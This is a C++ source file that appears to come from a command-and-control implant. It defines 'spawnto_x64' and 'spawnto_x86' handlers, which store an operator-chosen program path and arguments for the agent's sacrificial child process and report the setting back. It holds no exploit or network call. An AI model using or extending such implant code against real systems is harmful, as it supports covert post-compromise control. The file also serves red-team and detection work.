#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

using namespace stardust;
using namespace starburst;

#ifdef INCLUDE_CMD_SPAWNTO_X64

auto declfn starburst::cmd_spawnto_x64(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t app_len = 0;
    auto application = parser_string( params, &app_len );
    if ( !application || app_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no application path" ) ) );
        return;
    }

    uint32_t copy_len = app_len < 259 ? app_len : 259;
    memory::copy( inst.spawnto.x64, application, copy_len );
    inst.spawnto.x64[copy_len] = '\0';

    uint32_t args_len = 0;
    auto arguments = parser_string( params, &args_len );
    if ( arguments && args_len > 0 ) {
        uint32_t args_copy = args_len < 259 ? args_len : 259;
        memory::copy( inst.spawnto.x64_args, arguments, args_copy );
        inst.spawnto.x64_args[args_copy] = '\0';
    } else {
        inst.spawnto.x64_args[0] = '\0';
    }

    char msg[600] = {};
    auto prefix = symbol<const char*>( "spawnto_x64 set to: " );
    uint32_t i = 0;
    while ( prefix[i] && i < 500 ) { msg[i] = prefix[i]; i++; }
    uint32_t j = 0;
    while ( inst.spawnto.x64[j] && i < 598 ) { msg[i++] = inst.spawnto.x64[j++]; }
    if ( inst.spawnto.x64_args[0] ) {
        msg[i++] = ' ';
        j = 0;
        while ( inst.spawnto.x64_args[j] && i < 598 ) { msg[i++] = inst.spawnto.x64_args[j++]; }
    }
    msg[i] = '\0';

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif

#ifdef INCLUDE_CMD_SPAWNTO_X86

auto declfn starburst::cmd_spawnto_x86(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t app_len = 0;
    auto application = parser_string( params, &app_len );
    if ( !application || app_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no application path" ) ) );
        return;
    }

    uint32_t copy_len = app_len < 259 ? app_len : 259;
    memory::copy( inst.spawnto.x86, application, copy_len );
    inst.spawnto.x86[copy_len] = '\0';

    uint32_t args_len = 0;
    auto arguments = parser_string( params, &args_len );
    if ( arguments && args_len > 0 ) {
        uint32_t args_copy = args_len < 259 ? args_len : 259;
        memory::copy( inst.spawnto.x86_args, arguments, args_copy );
        inst.spawnto.x86_args[args_copy] = '\0';
    } else {
        inst.spawnto.x86_args[0] = '\0';
    }

    char msg[600] = {};
    auto prefix = symbol<const char*>( "spawnto_x86 set to: " );
    uint32_t i = 0;
    while ( prefix[i] && i < 500 ) { msg[i] = prefix[i]; i++; }
    uint32_t j = 0;
    while ( inst.spawnto.x86[j] && i < 598 ) { msg[i++] = inst.spawnto.x86[j++]; }
    if ( inst.spawnto.x86_args[0] ) {
        msg[i++] = ' ';
        j = 0;
        while ( inst.spawnto.x86_args[j] && i < 598 ) { msg[i++] = inst.spawnto.x86_args[j++]; }
    }
    msg[i] = '\0';

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
